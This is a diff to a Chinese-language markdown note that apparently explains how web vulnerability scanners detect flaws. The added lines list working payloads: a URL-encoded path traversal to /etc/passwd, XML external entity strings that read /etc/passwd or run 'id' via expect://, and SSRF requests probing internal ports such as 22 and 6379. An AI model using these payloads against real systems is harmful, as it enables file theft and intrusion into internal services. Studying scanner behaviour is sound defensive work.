@@ -86,9 +86,26 @@ GET /redirect.php?url=https:16843009
 ```
 
 ### 路径穿越检测
+读取 etc/passwd ../数量超过当前路径深度即可，无需完全匹配
 
+```
+..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
+```
 ### XML 注入
+```
+<?xml version="1.0"?><!DOCTYPE ANY [<!ENTITY content SYSTEM "file:///etc/passwd">]><a>&content;</a>
+<?xml version="1.0"?><!DOCTYPE ANY[<!ENTITY content PUBLIC "a" "file:///etc/passwd">]><a>&content;</a>
+<?xml version="1.0"?><!DOCTYPE ANY[<!ENTITY content PUBLIC "a" "expect://id">]><a>&content;</a>
+<?xml version="1.0"?><!DOCTYPE ANY [<!ENTITY content SYSTEM "http://127.0.0.1:34033/i/daa4e8/1bgq/9x48/">]><a>&content;</a>
+```
 
 ### SSRF 
+参数值带有协议头时触发检测逻辑，做端口探测
+```
+GET /ssrf.php?_url=http://127.0.0.1:22#@dmain.com/1.png
+GET /ssrf.php?_url=http://127.0.0.1:6379#@dmain.com/1.png
+GET /ssrf.php?_url=http://127.0.0.1:43017/i/e354b3/dogy/7ma9/
+GET /ssrf.php?_url=http://127.0.0.1:43017#@domain.com/i/e0c8ee/dogy/xsuy/
+```
 
 ## AWVS 篇
